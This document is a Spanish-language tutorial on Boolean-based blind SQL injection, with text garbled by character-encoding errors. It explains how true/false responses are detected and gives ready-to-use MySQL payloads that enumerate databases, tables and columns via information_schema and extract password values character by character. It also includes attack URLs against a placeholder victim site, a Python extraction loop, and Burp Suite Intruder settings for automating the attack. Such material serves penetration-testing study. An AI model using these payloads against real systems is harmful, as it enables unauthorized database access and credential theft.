# Que es un ataque blind SQL injection Boolean Based?
Blind SQL Injection Boolean Based es un tipo de ataque a bases de datos donde el atacante envÃ­a consultas maliciosas a una pÃ¡gina web para obtener informaciÃ³n, pero la pÃ¡gina no muestra directamente los datos.

En lugar de eso, la pÃ¡gina responde con "sÃ­" o "no" (verdadero o falso) segÃºn si la consulta que puso el atacante es cierta o falsa.

Por ejemplo, el atacante puede preguntar:

"Â¿La primera letra del nombre de usuario es una 'a'?"

Si la pÃ¡gina responde igual que cuando la respuesta es verdadera, sabe que la letra es 'a'. Si responde diferente, sabe que no lo es.

Repite estas preguntas cambiando letras y posiciones para ir descubriendo poco a poco la informaciÃ³n que quiere, como nombres de bases de datos, tablas o contraseÃ±as, sin que la pÃ¡gina muestre los datos directamente.

# Â¿como detecto el verdadero o falso?

Cuando haces una consulta maliciosa, la pÃ¡gina web responde de alguna forma. No te muestra directamente los datos, pero el comportamiento o la respuesta cambia segÃºn si la condiciÃ³n es verdadera o falsa.

Por ejemplo:

Si la condiciÃ³n es verdadera:
La pÃ¡gina carga normalmente, muestra el contenido habitual, o responde con un cÃ³digo HTTP 200 y el mismo tamaÃ±o o estructura de la pÃ¡gina que sin la inyecciÃ³n.

Si la condiciÃ³n es falsa:
La pÃ¡gina puede mostrar un error, una pÃ¡gina vacÃ­a, un mensaje distinto, o el cÃ³digo HTTP puede cambiar (por ejemplo 500, 403, o 404). TambiÃ©n puede cambiar el tamaÃ±o de la respuesta (la longitud del HTML) o cualquier otro detalle visible o medible.

# CÃ³mo detectar esto en prÃ¡ctica

1- Haces una peticiÃ³n â€œnormalâ€ sin inyecciÃ³n y guardas cÃ³mo responde (estatus, tamaÃ±o de respuesta, contenido).

2- EnvÃ­as la consulta inyectada con una condiciÃ³n que esperas que sea verdadera (por ejemplo, que la primera letra sea 'a').

3- Compruebas si la respuesta es igual a la normal (por ejemplo, misma longitud, mismo cÃ³digo HTTP). Si es igual, la condiciÃ³n es verdadera.

4- Cambias la condiciÃ³n (por ejemplo, pruebo con 'b') y si la respuesta cambia (mÃ¡s corta, error, diferente), la condiciÃ³n es falsa.

AsÃ­, comparando cÃ³mo responde la pÃ¡gina ante diferentes consultas, puedes ir adivinando carÃ¡cter por carÃ¡cter la informaciÃ³n oculta.



# Blind SQL Injection Boolean Based â€” EnumeraciÃ³n con iteraciÃ³n

Cuando detectamos una inyecciÃ³n Boolean Based Blind SQL, obtenemos respuestas verdadero/falso. Por eso se usa iteraciÃ³n para extraer informaciÃ³n carÃ¡cter a carÃ¡cter.

---

## Paso 1: Encontrar nombres de bases de datos

La consulta para obtener el carÃ¡cter en la posiciÃ³n `pos` del nombre de la base de datos nÃºmero `N` es:

```sql
' AND ASCII(SUBSTRING((SELECT schema_name FROM information_schema.schemata LIMIT N,1), pos, 1)) = X -- -
```

Donde:

- `N` es el Ã­ndice del nombre de base de datos (0, 1, 2, ...)
- `pos` es la posiciÃ³n del carÃ¡cter dentro del nombre (1, 2, 3, ...)
- `X` es el cÃ³digo ASCII del carÃ¡cter que se prueba (por ejemplo, 97 para 'a')

Para iterar la letra y posiciÃ³n, se prueba con diferentes valores de `X` (normalmente entre 32 y 126) y se aumenta `pos` hasta que no haya mÃ¡s caracteres (lo que se detecta porque la condiciÃ³n devuelve falso).

---

## Paso 2: Enumerar tablas de una base de datos especÃ­fica

Para la base de datos `nombre_bd`, usamos:

```sql
' AND ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema='nombre_bd' LIMIT N,1), pos, 1)) = X -- -
```

---

## Paso 3: Enumerar columnas de una tabla

Para la tabla `nombre_tabla` dentro de la base `nombre_bd`:

```sql
' AND ASCII(SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_schema='nombre_bd' AND table_name='nombre_tabla' LIMIT N,1), pos, 1)) = X -- -
```

---
---
### CÃ³mo extraer los datos de las columnas
Una vez que tienes el nombre de la base de datos, las tablas y las columnas, puedes extraer el contenido de las columnas de forma similar, iterando carÃ¡cter a carÃ¡cter.

Por ejemplo, para extraer el valor de la columna columna de la fila N en la tabla nombre_tabla de la base nombre_bd:
```sql
' AND ASCII(SUBSTRING((SELECT columna FROM nombre_bd.nombre_tabla LIMIT N,1), pos, 1)) = X -- -
```
AquÃ­:

N es el Ã­ndice de la fila (0 para la primera fila, 1 para la segunda, etc.).

pos es la posiciÃ³n del carÃ¡cter en el valor de la columna.

X es el valor ASCII que se prueba.

Este mÃ©todo permite extraer cualquier dato almacenado, letra a letra.

---

## Ejemplo con una URL vulnerable

Supongamos que tienes una URL vulnerable como esta:

```
http://victima.com/product.php?id=1
```

Para extraer la primera letra de la **primera base de datos** (`N=0`, `pos=1`), prueba:

```
http://victima.com/product.php?id=1' AND ASCII(SUBSTRING((SELECT schema_name FROM information_schema.schemata LIMIT 0,1),1,1))=97 -- -
```

Si la respuesta es **igual** a la de una peticiÃ³n normal (por ejemplo, se carga bien la pÃ¡gina), significa que el carÃ¡cter **sÃ­** es `'a'`.

Si cambia (error o comportamiento diferente), pruebas otro valor de `X`, por ejemplo 98, 99â€¦ hasta acertar el carÃ¡cter.

Para la **segunda base de datos** (`N=1`), usas:

```
http://victima.com/product.php?id=1' AND ASCII(SUBSTRING((SELECT schema_name FROM information_schema.schemata LIMIT 1,1),1,1))=X -- -
```

Y para la tercera:

```
http://victima.com/product.php?id=1' AND ASCII(SUBSTRING((SELECT schema_name FROM information_schema.schemata LIMIT 2,1),1,1))=X -- -
```

Del mismo modo, para obtener la **segunda tabla** (`N=1`) de la base `admin`:

```
http://victima.com/product.php?id=1' AND ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema='admin' LIMIT 1,1),1,1))=X -- -
```

Y para la **tercera columna** de la tabla `users`:

```
http://victima.com/product.php?id=1' AND ASCII(SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_schema='admin' AND table_name='users' LIMIT 2,1),1,1))=X -- -
```

Para extraer el primer carÃ¡cter de la primera fila de la columna password en la tabla users:

```
http://victima.com/product.php?id=1' AND ASCII(SUBSTRING((SELECT password FROM admin.users LIMIT 0,1),1,1))=X -- -
```
---

## Ejemplo simplificado en pseudocÃ³digo

```python
for N in range(0, total_bases):
    nombre = ""
    pos = 1
    while True:
        encontrado = False
        for X in range(32, 127):
            payload = f"' AND ASCII(SUBSTRING((SELECT schema_name FROM information_schema.schemata LIMIT {N},1), {pos}, 1)) = {X} -- -"
            if consulta_boolean(payload):  # funciÃ³n que hace la consulta y devuelve True o False
                nombre += chr(X)
                pos += 1
                encontrado = True
                break
        if not encontrado:
            break
    print(f'Base {N}: {nombre}')

```

---

### Para tablas:

```python
payload = f"' AND ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema='{nombre_bd}' LIMIT {N},1), {pos}, 1)) = {X} -- -"
```

---

### Para columnas:

```python
payload = f"' AND ASCII(SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_schema='{nombre_bd}' AND table_name='{nombre_tabla}' LIMIT {N},1), {pos}, 1)) = {X} -- -"
```

---

---

### Para extraer datos de columnas:

```
payload = f"' AND ASCII(SUBSTRING((SELECT {nombre_columna} FROM {nombre_bd}.{nombre_tabla} LIMIT {N},1), {pos}, 1)) = {X} -- -"
```


---


## Resumen

- Usar la funciÃ³n SQL `SUBSTRING` para extraer caracteres uno a uno.
- Usar `ASCII()` para comparar el carÃ¡cter con un nÃºmero.
- Usar `LIMIT N,1` para iterar sobre cada nombre (base, tabla, columna).
- Iterar `pos` para avanzar letra a letra.
- Iterar `X` para encontrar el valor ASCII correcto.
- Cuando no se encuentra ningÃºn carÃ¡cter para una `pos`, se asume fin del nombre.

---
# Blind SQL Injection Boolean Based â€” AutomatizaciÃ³n con Burp Suite Intruder

Esta guÃ­a te muestra cÃ³mo automatizar la enumeraciÃ³n de bases de datos, tablas y columnas en una SQLi ciega (boolean based) usando **Burp Suite Intruder**.

---

## ðŸ’¡ Contexto de la inyecciÃ³n

SupÃ³n que tienes una URL vulnerable como esta:

```
http://victima.com/product.php?id=1
```

Y comprobaste que una inyecciÃ³n del tipo:

```
' AND ASCII(SUBSTRING((SELECT schema_name FROM information_schema.schemata LIMIT 0,1),1,1)) = 97 -- -
```

te da respuesta diferente si el carÃ¡cter **sÃ­** es `'a'` (ASCII 97).

---

## ðŸ”§ Configurar Burp Intruder

### 1. Captura la peticiÃ³n en Burp

Visita la URL vulnerable en tu navegador con Burp activado:

http://victima.com/product.php?id=1

Y envÃ­ala al **Intruder** (`Right-click > Send to Intruder`).

---

### 2. Configura los payloads

#### Positions tab

En el parÃ¡metro `id`, deja solo un marcador donde irÃ¡ el valor ASCII.

Para extraer **nombres de bases de datos**, por ejemplo:

    id=1' AND ASCII(SUBSTRING((SELECT schema_name FROM information_schema.schemata LIMIT 0,1),1,1))=Â§XÂ§ -- -

Para extraer **nombres de tablas** de la base `admin`:

    id=1' AND ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema='admin' LIMIT 0,1),1,1))=Â§XÂ§ -- -

Para extraer **nombres de columnas** de la tabla `users` en la base `admin`:

    id=1' AND ASCII(SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_schema='admin' AND table_name='users' LIMIT 0,1),1,1))=Â§XÂ§ -- -

Para extraer **datos especÃ­ficos de una columna**, por ejemplo la columna `password` de la tabla `users` en la base `admin` (fila 0, primer carÃ¡cter):

    id=1' AND ASCII(SUBSTRING((SELECT password FROM admin.users LIMIT 0,1),1,1))=Â§XÂ§ -- -

(`Â§XÂ§` serÃ¡ el payload que variarÃ¡, del 32 al 126)

---

#### Payloads tab

- **Payload type**: Numbers  
- **From**: 32  
- **To**: 126  
- **Step**: 1  
- Opcional: Marca "Add encoding" si el servidor escapa caracteres  

---

### 3. Iniciar ataque

Haz clic en **Start Attack**.

Burp enviarÃ¡ la misma peticiÃ³n con valores de ASCII del 32 al 126 para la letra 1 (`pos=1`) del elemento (base, tabla, columna o dato) seleccionado.

---

## ðŸ” CÃ³mo interpretar resultados

En la tabla de resultados, mira la columna **Length**, **Status** o el contenido de la respuesta.

- Cuando el valor ASCII **coincide**, la pÃ¡gina responde **igual que una vÃ¡lida** (por ejemplo, status 200 con contenido similar).
- Cuando no coincide, hay un cambio visible (menor longitud, error, redirecciÃ³n, etc.).

ðŸ’¡ Usa la columna "Length" como indicador principal. Marca manualmente cuÃ¡l valor da `true`, tradÃºcelo a `chr(X)`, y guarda esa letra.

---

## ðŸ” Para iterar posiciones y elementos

Para seguir con la **segunda letra** del nombre o dato:

    ... SUBSTRING(...,2,1))=Â§XÂ§ -- -

Para la **segunda base de datos**:

    ... schemata LIMIT 1,1 ...

Para la **segunda tabla** de la base `admin`:

    ... FROM information_schema.tables WHERE table_schema='admin' LIMIT 1,1 ...

Para la **segunda columna** de la tabla `users`:

    ... FROM information_schema.columns WHERE table_schema='admin' AND table_name='users' LIMIT 1,1 ...

Para la **segunda fila** (registro) de datos en la columna `password`:

    ... FROM admin.users LIMIT 1,1 ...

---

## ðŸ“Œ Consejos Ãºtiles

- Guarda cada letra extraÃ­da y reconstruye el nombre o dato completo paso a paso.
- Usa funciones como `BURP -> Intruder -> Cluster bomb` para automatizar variaciones de `X` (ASCII) y `pos` (posiciÃ³n).
- Para acelerar, puedes usar comparaciones binarias (`>`, `<`) y hacer bÃºsquedas binarias.

---

## âœ… Resumen del proceso

| AcciÃ³n                | Modifica                                 |
|-----------------------|-----------------------------------------|
| Otra base             | `LIMIT N,1` en `information_schema.schemata`        |
| Otra letra            | `SUBSTRING(..., pos, 1)`                 |
| Otra tabla            | `FROM information_schema.tables WHERE table_schema='NOMBRE' LIMIT N,1`  |
| Otra columna          | `FROM information_schema.columns WHERE table_schema='NOMBRE' AND table_name='TABLA' LIMIT N,1` |
| Otro dato en columna  | `FROM admin.users LIMIT N,1` para fila, y `SUBSTRING(..., pos, 1)` para letra |

---

## ðŸ“Ž Ejemplos generales de payloads

- Extraer la **tercera letra** de la **primera columna** de la tabla `users` en la base `admin`:

    ' AND ASCII(SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_schema='admin' AND table_name='users' LIMIT 0,1),3,1))=Â§XÂ§ -- -

- Extraer la **primera letra** de la **primera fila** de la columna `password` de la tabla `users` en la base `admin`:

    ' AND ASCII(SUBSTRING((SELECT password FROM admin.users LIMIT 0,1),1,1))=Â§XÂ§ -- -

---
